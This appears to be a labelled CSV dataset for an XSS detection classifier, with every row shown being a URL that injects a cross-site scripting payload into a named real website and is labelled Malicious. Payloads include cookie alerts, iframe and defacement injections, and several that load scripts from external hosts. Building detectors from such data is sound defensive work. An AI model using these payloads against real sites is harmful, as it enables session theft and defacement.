Payloads,Class
http://www.hitlist.in/index.php?page=in&amp;id=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://keznews.com/search?s=vista+sp1+crack&amp;s_what='&quot;&gt;&lt;/script&gt;&lt;iframe/src=http://xssed.com&gt;&lt;h1&gt;hack<br>ed+by+trex&lt;/h1&gt;,Malicious
http://www.valmarkpro.info/sis/?msg='%22%3e%3ciframe%20src=http://ombreetlumiere.wow.free.fr/forum/i<br>ndex.php/%3e,Malicious
http://www.soyle.net/guzel_sozler/bolumler.php?op=katbak&amp;id=%22%3e%3ciframe%20src=http://hotturks.or<br>g/%3e,Malicious
http://www.un-instraw.org/en/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be<br>%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;url=%0acontent-type:%16text/html%0acontent-length:13%0a%0ayou%20<br>are%20xssed%20,Malicious
http://www.un-az.org/dpi/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be%a1&amp;<br>task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;url=%0acontent-type:%16text/html%0acontent-length:13%0a%0ayou%20are%<br>20xssed%20,Malicious
http://www.guaratuba.pr.gov.br/site/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%9<br>5%e4%be%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;url=%0acontent-type:%16text/html%0acontent-length:13%0a%0<br>ayou%20are%20xssed%20,Malicious
http://search.msn.com.tr/results.aspx?q=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://search.msn.it/results.aspx?q=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://search.msn.es/results.aspx?q=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://search.msn.com.br/results.aspx?q=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://kartor.eniro.se/query?what=cs&amp;search_word=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
"http://www.wshblaw.com/news.php?type=newsletters,updates%27%22%3e%3cimg%20src=k.png%20onerror=alert(<br>/xss/.source)%20/%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20mystick%3c/h1%3e%3c/marquee%3e",Malicious
http://www.foros.bfes.ea.com/forum/viewtopic.php?t=12141&amp;view=next&amp;sid=%22%3e%3cscript%3ealert(/www.<br>r3t.n3t.nl/)%3c/script%3e,Malicious
http://www.info.ea.com/news/news.php?function=search&amp;search_for=%22%3e%3cscript%3ealert(/www.r3t.n3t<br>.nl/)%3c/script%3e,Malicious
http://groups.fotolog.com/category?locale=en&amp;id=&quot;&gt;&lt;script&gt;alert(/www.r3t.n3t.nl/)&lt;/script&gt;,Malicious
http://www.titivillus.it/periodico.php?id=15%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://ged.latribune.fr/zetasearch/recherche/index.jsp?dn_search=%27%22%3e%3c/script%3e%3cscript%3ealert%28%22xss%22%29%3c/script%3e,Malicious
"http://bg.msi.com/service/search/?kw=%27;alert%28string.fromcharcode%2888,%2083,%2083,%2032,%2098,%20121,%2032,%2075,%20101,%20101,%20112,%20101,%20114%29%29//\%27;alert%28string.fromcharcode%2888,83,83%29%29//%22;alert%28string.fromcharcode%2888,%2083,%2083,%2032,%2098,%20121,%2032,%2075,%20101,%20101,%20112,%20101,%20114%29%29//\%22;alert%28string.fromcharcode%2888,%2083,%2083,%2032,%2098,%20121,%2032,%2075,%20101,%20101,%20112,%20101,%20114%29%29//--%3e%3c/script%3e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2888,%2083,%2083,%2032,%2098,%20121,%2032,%2075,%20101,%20101,%20112,%20101,%20114%29%29%3c/script%3e&type=product",Malicious
"http://lavillette.com/recherche/?q=<script>document.write(string.fromcharcode(60, 105, 102, 114, 97,109, 101, 32, 115, 114, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 120, 115, 115, 101, 100, 46, 99,111, 109, 34, 62))</script>",Malicious
https://www.peabody.harvard.edu/cmhi/detail.php?num=25&site=yaxchilan%22%3e%3ciframe%20onload=alert%28%27vajra%27%29%3e&type=lintel,Malicious
https://renewus.avg.com//index.php?option=com_wdshop&view=userinfo&ajax_json=ajax_fill_city_state&format=raw&zip=%27%22--%3e%3c/style%3e%3c/script%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
"https://topup.orange.com/?_lang=""><script>alert(document.cookie)</script>",Malicious
http://loadgamesvf.bet365.com/f1x2games/loadgame.jsp?gameid=f1x2_football&version=1&lang=%22en&acc_id=1ec6296318cf49888464bda22a78eb2c000004&baseurl=%22);%3c/script%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.sfelipeneri.edu.ec/fedec/book/guestbook.php?act=show&page=2584&lang=%22%3e%3e%3cscript%3ealert%28%22\\_ur0b0r0x_/%22%29%3c/script%3e,Malicious
http://tikona.in/pincode.php?contentid=%22%3e%3cscript%3ealert%28/www/%29%3c/script%3e,Malicious
"http://www.coolwebscripts.com/search_view_script.php?search=/""><script>alert(1)</script>&cat_drop=&offset=0&toshow=20&go.x=14&go.y=14",Malicious
"http://www.clixsense.com/en/games/%22%3e%3cscript%3ealert%28string.fromcharcode%28110,%2048,%2099,%2097,%2082,%20101,%2084,%20101,%2065,%20109,%2032,%2088,%20115,%20115%29%29%3c/script%3e%3ciframe%20src=%22http://xssed.com%22%3e",Malicious
http://www.universal-alliance.de/index.php?site=message&msg=<script>alert(1)</script>,Malicious
http://ayalists.yale.edu/lists/lists.php?id=15%27%22%3e%3cscript%3ealert%28/xss/%29%3c/script%3e,Malicious
"http://www.hostinway.com/login/?ru=p3bhz2u9agvscgrlc2smywn0aw9upwfkzf90awnrzxq=""><script>alert('xssby atm0n3r | fucking spamer !')</script>",Malicious
"http://reseller-sisko.kamadeva.com/index.php?alert=<iframe src=""http://xssed.com"">",Malicious
"http://bestsellers-rx.com/search.php?search_text=/""><script>alert(1)</script>&i1.x=12&i1.y=14",Malicious
"http://buyingprograf.org/search.php?search_text=/""><script>alert(1)</script>&i1.x=12&i1.y=14",Malicious
"http://www.entegreharc.com.tr//tr/search/?k=%27%22%28%29%26%251%3cscript%20%3ealert%28string.fromcharcode%2888,83,83%29%29%3c%2fscript%3e&s=1",Malicious
"http://web.glcollaboration.com/viewer.php?meeting_id="">'><script>alert(document.cookie)</script>",Malicious
http://www.expopakistan.gov.pk/mission-admin/login.php?err=%3ch1%3exssed%20by%20ne0%20from%20cyber-71%20bangladesh%3c/h1%3e%3ciframe%20src=//xssed.com%3e,Malicious
http://www.pctools.com/mrc/infections/query/%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e/,Malicious
"http://118.tct.ir/exe/<script>alert(string.fromcharcode(97, 51, 113))</script>",Malicious
http://www.cleaner-production.de/suchergebnisse/?tx_frommosearch_pi1[sword]=%22%3e%3cscript%3ealert%28%27guess_we_are_behind_enemy_lines%27%29%3c/script%3e,Malicious
http://ibnlive.in.com/searcher/search.php?searchq=%22%3e%3c%2fdiv%3e%3cscript+src=http://cim.edu.ph/...%2fxss.js%3e%3c%2fscript%3e&domain=http%3a%2f%2fwww.ibnlive.in.com,Malicious
http://bangladesh-airlines.com/index.php?action=newsletter_action&module_page=1%3cscript%20%3eprompt%2849371337%29%3c%2fscript%3e&page=1,Malicious
"https://portal.hessen.de/irj/hstk_internet?cid=5ed9d889b31ee937bc3d089097400d98&mailformsaction=submit""//--><img src=x onerror=alert(document.cookie)><!--",Malicious
http://www.plusline.org/article.php?id=6068%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://old.brownsvilleherald.com/opinions.php?id=1180%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.clicfolio.com/clicfolio/curriculum.php?id=7934%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.inhealthnw.com/story.php?id=143%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.f4customs.com/install_pages.php?id=8%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://old.cageprisoners.com/articles.php?id=25632%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.marchantbrothers.co.uk/mix.php?id=-61%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.sisef.it/iforest/contents/?id=ifor0469-0010141%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://sonica.speedy.com.ar/resultado_busqueda.php?tipo=1&texto=%22%3e%3cscript%3ealert%28%2fxss%2f%29%3c%2fscript%3e,Malicious
http://receptome.stanford.edu/hpmr/searchdb/findgenes.asp?textname=%3cscript%3ealert%28%22zargar%20yasir%22%29%3c%2fscript%3e,Malicious
http://byinvitationonlyphotos.americanexpress.com/photo.php?img=7259%22%3e%3cscript%3ealert%28document.cookie%29;%3c/script%3e&p=680%27&intlink=bio_twitter,Malicious
http://www.wikia.com/special:usersignup?returnto=spezial:%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://support.lexmark.com/index?page=answers&startover=y&locale=en&userlocale=en_us&question=%3ciframe%20src%3dhttp%3a%2f%2fxssed.com%3e,Malicious
https://support.snapchat.com/login?next=%22%3e%3cscript%3ealert%28%27troy%27%29%3c/script%3e,Malicious
http://ponsel-online.com/index.php?action=store.showproduct&product_id=<script>alert(31337);</script>,Malicious
http://www.shopparos.gr/results.asp?q=%22%3c/title%3e%3cscript%3ealert%28%22xss%20by%20d@ydream%22%29;%3c/script%3e,Malicious
http://www.thebestdata.com/zoom.aspx?menutype=1&auto=3240&t=ssssssssssss%22%3e%3cimg%20src=x%20onerror=alert%28%27xssed%27%29%3e,Malicious
"http://bg.888.com/new888/home.htm?lang=bg'%22--%3e%3c/style%3e%3c/script%3e%3cscript%3ealert(string.fromcharcode(66,101,115,116,32,114,101,103,97,114,100,115,32,102,114,111,109,32,66,117,108,103,97,114,105,97))%3c/script%3e'%22%3e%3cscript%3edocument.body.innerhtml=%22%3cstyle%3ebody{visibility:hidden;%20background:black;}%3c/style%3e%3cdiv%20style=visibility:visible;%3e%3ccenter%3e%3ch1%3e%3cfont%20color='white'%3eplease%20fix%20your%20%3c/font%3e%3cfont%20color='red'%3e%20xss%20%3c/font%3e%3cfont%20color='white'%3e!%3c/font%3e%3c/h1%3e%3cfont%20color='white'%3ebest%20regards%20from%20bulgaria!%3ch1%3e%3cfont%20color='red'%3e%20%20flexxpoint%3c/font%3e%3c/h1%3e%3cbr%3e%22;%3c/script%3e&s=794749718861938843&os=794749718861938843&sr=480048&osr=480048&flag=no&un=true&l=&st=0&bc=123&anid=0&ic=28&se=611860&isus=false&istur=false&isau=false%a4cy=eur&osadcampaign=&page=main&iframe=yes",Malicious
http://www.mercadolibre.com.do/dominicana/ml/l_user.main?as_filtro_id=certified_usr&as_nickname=%a0&as_pcia_id=%3e%22%3e%3cscript%3ealert%28%27xss%27%29;%3c/script%3e,Malicious
http://www.mercadolibre.com.ar/argentina/ml/l_user.main?as_filtro_id=certified_usr&as_nickname=%a0&as_pcia_id=%3e%22%3e%3cscript%3ealert%28%27xss%27%29;%3c/script%3e,Malicious
"http://www.immoregion.fr/alsace/recherche/resultats/tr/by/p//""><script>alert('xss by atm0n3r')</script>",Malicious
http://c2.com/cgi/wiki?edit=%22%3e%3cscript%3ealert%28%22http://st2tea.blogspot.com%22%29%3c/script%3e,Malicious
http://caqueta.gov.co/sitio.shtml?apc=b1--&s=b&nocache=1&als[vbuscar]=%22/%3e%3cbody%20onload=alert%28document.cookie%29%3e,Malicious
"http://www.specials.msn.co.in/sp09/mandate2009/livesearch.aspx?id=gujarat+elections""><script>alert(/xss/)</script>",Malicious
"http://www.sicherheit.info/si/cms.nsf/si.articles.search?searchview&query=""><script>alert(document.cookie)</script>",Malicious
"http://www.ibk.co.kr/common/error/browser.jsp?returnurl=""><script>alert(document.cookie)</script>",Malicious
"http://jqueryui.com/themeroller/#ffdefault=""/><script>alert(/xss: vijayendra/)</script>",Malicious
http://music.raag.fm/search.php?search_string=%27%22%3e%3cscript%3ealert%28%2fhacked%2f%29%3c%2fscript%3e&search_type=singer,Malicious
http://new.davidguetta.com/fr/taxonomy/term/111?destination=%27%22--%3e%3c/style%3e%3c/script%3e%3cscript%3ealert%280x00d0f6%29%3c/script%3e,Malicious
http://www.avoe.ge/games/one.php?mid=%3cscript%3ealert%28/data/%29%3c/script%3e,Malicious
"http://www.microsoft.com/download/en/search.aspx?q=t*&p=0&r=10&t=3&s=availabledate~descending'""--><script x src=//0x.lv?</style></script><script>alert(string.fromcharcode(66,101,115,116,32,114,101,103,97,114,100,115,32,102,114,111,109,32,66,117,108,103,97,114,105,97))</script><script src=http://ckers.org/xss.js>",Malicious
"http://commondatastorage.googleapis.com/chromium-browser-continuous/index.html?path=""><script>alert('xss')</script>",Malicious
"http://chromium-browser-symbols.commondatastorage.googleapis.com/index.html?path=""><script>alert('xss')</script>",Malicious
http://ar.netlog.com/go/search/view=people&q=%22%3e%3cscript%3ealert%281%29;%3c/script%3e&%22%3e%3cscript%3ealert%28511%29;%3c/script%3e=g,Malicious
http://www.forgetsecurity.es/products/screenshots.php?lang=%22%3e%3ciframe%20onload=alert%28/xss/%29%3e,Malicious
http://www.elhacker.org/index.php?ver=webshackeadas&botnot=16%22%3e%3ciframe%20onload=alert%28/xss/%29%3e,Malicious
http://about.skype.com/press/enquiry/phorm/phorm.php?phorm_config=%22%3e%3cbody%20onload=alert%28document.cookie%29%3e,Malicious
http://static.brazzers.com/docs/ipp.php?site=%22%3e%3ciframe%20onload=alert%28document.cookie%29%3e,Malicious
"http://www.npsinternational.com/product_detail.php?catid=1&pid=""><script>alert(1)</script>",Malicious
"http://www.yatashomeaydin.com/tr/urunlerimiz_detay.php?idurun=""><script>alert(1)</script>",Malicious
http://www.picpiggy.com/list.php?q=pwn+%3cscript/src=%22http://tmp.vgood.com.tw/poc.js%22%3e%3c/script%3e+pwn,Malicious
http://pktube.onepakistan.com/list.php?q=pwn+%3cscript/src=%22http://tmp.vgood.com.tw/poc.js%22%3e%3c/script%3e+pwn,Malicious
"http://find.scourt.go.kr/cgi-bin/homepage.cgi?option=full&query=""><script>alert(123)</script>",Malicious
http://www.metroflog.com/search.php?cx=partner-pub-7814731125428179%3a2tu1mep6cd2&cof=forid%3a10&ie=iso-8859-1&q=%22%2b{valueof%3alocation%2c+tostring%3a+[].join%2c0%3a%27jav\x61script%3aalert+\x280%29%27%2clength%3a1}%2f%2f+%3cscript%3ealert%28%22pwned%22%29%3c%2fscript%3e+%3cscript%3ealert%28%22by%22%29%3c%2fscript%3e+%3cscript%3ealert%28%22sh3n%22%29%3c%2fscript%3e+%3cscript%3efunction+do_main%28%29{+%09document.body.innerhtml+%3d+%22%3ch1%3exshacked+by+sh3n%22%3b+}++do_main%28%29%3b+%3c%2fscript%3e+%2f%2f&sa=buscar,Malicious
https://www.adobe.com/bin/concurrentusage.cgi?spk_customername=%22%3e%3cscript%3ealert%28%22xss%22%29%3c%2fscript%3e&spk_address1=&spk_address2=&spk_address3=&spk_city=&spk_state=unselected&spk_zip=&spk_country=unselected&spk_contactname=&spk_phone=&spk_email=&spk_mvlpnumber=&mm_product_array[0]=select+platform&spk_prod0=&spk_ser0=&mm_product_array[1]=select+platform&spk_prod1=&spk_ser1=&mm_product_array[2]=select+platform&spk_prod2=&spk_ser2=&mm_product_array[3]=select+platform&spk_prod3=&spk_ser3=&mm_product_array[4]=select+platform&spk_prod4=&spk_ser4=&mm_product_array[5]=select+platform&spk_prod5=&spk_ser5=&mm_product_array[6]=select+platform&spk_prod6=&spk_ser6=&mm_product_array[7]=select+platform&spk_prod7=&spk_ser7=&mm_product_array[8]=select+platform&spk_prod8=&spk_ser8=&mm_product_array[9]=select+platform&spk_prod9=&spk_ser9=&submit=submit&user_submitted=yes&product_flag=%27%24product_flag%27,Malicious
http://www.real.com/realone/trial_terms.html?src=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
"http://www.icq.com/download/it/?ncid=""><script>alert('xss')</script>",Malicious
http://www.rockware.com/home/searchresult.php?searchquery=%3cscript%3ealert%28%22xss.by.03storic%22%29%3c%2fscript%3e&x=23&y=6,Malicious
http://www.ghana50.gov.gh/tourism/index.php?op=getashantisiteinfo&id=<script>alert(document.cookie)</script>,Malicious
"http://xmasshop.msn.ch/index.php?s=""><iframe src=""http://xssed.com"">",Malicious
"http://guide-envies.femmes.fr.msn.com/produit_type.php?id=441&rub=""><script>alert(document.cookie)</script>",Malicious
http://adspecs.yahoo.co.uk/search?q=+}%3c%2fstyle%3e%3cscript%3ea%3deval%3bb%3dalert%3ba%28b%28%2fxss%2f.source%29%29%3b%3c%2fscript%3e%3cmarquee+bgcolor%3d%22red%22%3e%3ch1%3exss3d+by+hari%28topsecure.net%29%3c%2fh1%3e%3c%2fmarquee%3e&addr=&hs=1&lat=&lon=&locac=0,Malicious
http://www.vatican.va/redemptoris_mater/flash/index.html?lingua=it%22----%3e%3e''%3e%3cscript%3ealert('xss')%3c/script%3e,Malicious
"http://acikartirma.tr.msn.com/shop/auctions/auctiondetails.aspx?auctionid=8693163&rn=2&stype=finishdate&sorder=asc""><script>alert(document.cookie)</script>",Malicious
"http://www.clg-brassens-boucbelair.ac-aix-marseille.fr/spip/?calendrier_mois=6&calendrier_annee=2010""><script>alert(1337)</script>",Malicious
http://www.nick.com/search/?term=<script>alert(666)</script>,Malicious
http://jeux.ch.msn.com/?game=19%3cscript%3ealert%28%27airroxssed%27%29;%3c/script%3e,Malicious
"http://celebrity.it.msn.com/index.cfm?objectid=69996]<h1>xss%20by%20bl4ck<br>from%20poland<br>gr33tz%20to:%20sid.psycho;]</h1><br><img%20src=""javascript:alert('xss%20by%20bl4ck')"">",Malicious
http://www.neopets.com/games/iom/i_of_m_view_item.phtml?item=goblet%22%3e%3cscript%3ealert(8)%3c/script%3e&max_defense=14%27,Malicious
"http://se.advertising.com/searchresults.php?keyword=that""><script>alert(document.cookie)</script>",Malicious
"http://no.advertising.com/searchresults.php?keyword=that""><script>alert(document.cookie)</script>",Malicious
"http://es.advertising.com/searchresults.php?keyword=that""><script>alert(document.cookie)</script>",Malicious
http://www.posao-info.com/poslovi/pretraga.php?rec=%22%3e%3cscript%20src=http://scras.freehostia.com/script.js%3e%3c/script%3e&trazi=tra%9ei,Malicious
http://www.cafemontenegro.com/index.php?search=%22%3e%3cscript%20src=http://scras.freehostia.com/script.js%3e%3c/script%3e,Malicious
"http://uni17.ogame.it/game/redir.php?url=http://%3c%22%3c%3cscript>alert(document.cookie)</script>"">//><script>alert(document.location)</script>"">/fuck_this_stupid_game_by_xados/><script>alert(0)</script>",Malicious
http://showing.com/search/videos/?s=%22%3e%3cscript%3ealert(%27xssed%27)%3c/script%3e,Malicious
"http://www.saab.co.nz/servlet/saabmail?attch1=111-222-1933email@address.tst&template=%2fmain%2fcommon%2fpostcard_redirect%2ehtml&body=%2e%2e%2fbody%2etxt&site=>""><script%20%0a%0d>alert(/xss%20by%20turkpower/)%3b</script><h1>xss%20by%20turkpower</h1></marquee>",Malicious
http://thegioiwebsite.net/tin-tuc/?action=view&pcatid=78%22%3e%3cscript%3ealert%281%29%3c/script%3e&scatid=86&newsid=71,Malicious
http://www.samuraioflegend.com/register.php?ref='%3e%3ciframe%20src=http://google.com%3e,Malicious
http://www.newsmob.com/register/register.php?h=0&amp;w=&amp;user=%22%3e%3ciframe%20src=http://google.com%3e,Malicious
http://www.snarf-it.org/pages/search.html?query=%3cscript%3ealert%28document.cookie%29%3b%3c%2fscrip<br>t%3e&amp;submit2=go%21,Malicious
http://www.demondimension.com/register.php?ref=1'&gt;&lt;iframe%20src=http://google.com&gt;,Malicious
http://www.2244thegame.co.uk/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.geldmolen.info/register.php?ref=76&quot;&gt;a&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&lt;!--,Malicious
http://www.gangstergreed.com/?ref=&quot;&gt;a&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.smileyreferrals4you.com/members/register.php?ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/scrip<br>t&gt;,Malicious
http://www.dark-warriors.net/register.php?ref=&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.velocityclicks.com/index.php?view=join&amp;ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&lt;!--<br>,Malicious
http://www.zeuslegacy.com/register.php?ref=&gt;&lt;br&gt;&lt;script&gt;alert(document.cookie);&lt;/script,Malicious
http://www.trybalworld.org/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.lostcity.cc/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.ptc-house.com/index.php?ref=&quot;&gt;testicles&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&lt;!--,Malicious
http://www.militiawars.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.thecrimelife.net/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.caveages.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.d4rk-n4tions.com/register.php?ref=1'&gt;&lt;iframe%20src=http://google.com&gt;,Malicious
http://www.cash2grab.com/members/register.php?ref=wangpeng9904&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/scr<br>ipt&gt;,Malicious
http://alteredfuture.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://exmafia.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.imranli.gov.tr/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=index2.php?option=<br>com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;url=http://<br>xssed.com,Malicious
http://www.hatay-cevreorman.gov.tr/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=index2.ph<br>p?option=com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;ur<br>l=http://xssed.com,Malicious
http://www.accessclarkcounty.com/pages/404.aspx?aspxerrorpath=%3cscript%3ealert(/fucked/)%3c/script%<br>3e,Malicious
http://www.hediyeplaystation.com/aciklama.php?id=878%22%3e%3cscript%3ealert(/size%20g%fczel%20bi%fee<br>y%20hediye%20ederim/)%3c/script%3e,Malicious
http://www.mavigibi.com/forum/post_operations.asp?action=deletepost&amp;postid=&lt;/script&gt;&lt;script&gt;alert(/x<br>ss/)&lt;/script&gt;,Malicious
http://ara.yasirpro.com/ara.asp?ara=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e&amp;imagefield.x=0&amp;ima<br>gefield.y=0,Malicious
http://www.bolumuftulugu.gov.tr/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=index2.php?o<br>ption=com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;url=h<br>ttp://xssed.com,Malicious
http://mybasvuru.com/basvurutamamlandi_mybasvuru.asp?ref=&lt;body bgcolor=black&gt;&lt;iframe width=&quot;800&quot;<br>height=&quot;500&quot; src=&quot;http://gamil.net.tc&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(/gamilnetprotection/)&lt;/script&gt;,Malicious
http://livesearch.msn.co.kr/(s(5xyffybmheu0il3b2vhkqqyv))/results.aspx?q=http//wwwgoogle.co.ip/%22%3<br>e%3cscript%3ealert(/st@rext/)%3c/script%3e&amp;mkt=ko-kr&amp;form=ksrch1,Malicious
http://bbs.msn.co.kr/i-pin/ipin_request.asp?hexpuid=%22%3e%3cbody+onload=document.write(%27fux0r%27)<br>%3e,Malicious
http://news.msn.co.kr/article/read.html?cate_code=1200&amp;article_id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/<br>script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.tekirdagfenlisesi.k12.tr/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=index2.p<br>hp?option=com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;u<br>rl=http://xssed.com,Malicious
http://tv.msn.co.kr/enter/enternews/read.html?cate_code=5200&amp;article_id=&quot;&gt;&lt;script&gt;alert(document.coo<br>kie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://tv.msn.co.kr/enter/mvholic/magazine/magazine_face.html?article_id=&quot;&gt;&lt;script&gt;alert(document.co<br>okie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://ucc.msn.co.kr/ucc_msn_srch.htm?mode=srch&amp;code=biz&amp;keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.cesr-eu.org/index.php?page=groups&amp;id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.kktcb.eu/index.php?men=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcotic<br>xs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.odp.org.tr/genel/bizden_detay.php?kod=584&amp;tipi=4&amp;sube=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://docweb.estesl.ipl.pt/docbweb/pesqres.asp?startrec=0&amp;base=web&amp;form=comp&amp;recpag=5&amp;searchtxt=&quot;&gt;&lt;<br>script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.cm-coimbra.pt/bmc/pesqres.asp?startrec=0&amp;base=web&amp;form=comp&amp;recpag=5&amp;searchtxt=&quot;&gt;&lt;script&gt;<br>alert(document.cookie)&lt;/script&gt;,Malicious
http://www.nope.dk/listkat.php?idp=10&amp;ids=5&amp;idt=0&amp;hl=14014&amp;page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/sc<br>ript&gt;,Malicious
http://www.masterlube.com/services/service.php?id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.einbeck-online.de/service.php?id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.glam.com/app/site/loadservicepage.act?id=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
